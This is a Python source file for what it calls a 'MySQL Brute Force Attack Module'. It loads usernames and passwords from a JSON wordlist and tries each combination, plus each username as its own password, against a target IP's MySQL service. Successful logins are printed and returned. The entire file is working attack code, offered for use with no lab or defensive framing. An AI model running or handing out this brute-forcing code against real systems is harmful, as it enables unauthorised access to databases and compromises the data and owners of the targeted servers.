'''
name : MySQL Brute Force Attack Module
description : This module performs a brute force attack on the MySQL service to gain access.
version : 1.0
author : Ayato
'''

import pymysql
import json

def open_wordlist(wordlist_path):
    try:
        with open(wordlist_path, 'r') as f:
            wordlist = json.load(f)
        return wordlist
    except FileNotFoundError:
        print(f"[-] Wordlist file {wordlist_path} not found.")
        return None

def try_access(ip, username, password):
    print(f"[*] Trying {username}:{password} on {ip}")
    try:
        connection = pymysql.connect(
            host=ip,
            user=username,
            password=password,
            connect_timeout=5
        )
        print(f"[+] Successful login: {username}:{password} on {ip}")
        connection.close()
        return True
    except pymysql.MySQLError as e:
        print(f"[-] MySQL error on {ip} with {username}:{password}: {e}")
        return False
    except Exception as e:
        print(f"[-] Error on {ip} with {username}:{password}: {e}")
        return False

def run(ip, wordlist):
    print("[*] Running MySQL brute force attack module...")
    wordlist = open_wordlist(wordlist)
    if not wordlist:
        print("[-] No credentials to try. Exiting.")
        return -1
    print(f"[*] Using wordlist: {wordlist}")
    print(f"[*] Target IP: {ip}")
    success = {}
    for username in wordlist['usernames']:
        for password in wordlist['passwords']:
            if try_access(ip, username, password):
                print(f"[+] Access gained with {username}:{password} on {ip}")
                success[username] = password
            if try_access(ip, username, username):
                print(f"[+] Access gained with {username}:{username} on {ip}")
                success[username] = username
    if not success:
        print(f"[-] No valid credentials found on {ip}.")
        return -1
    return success
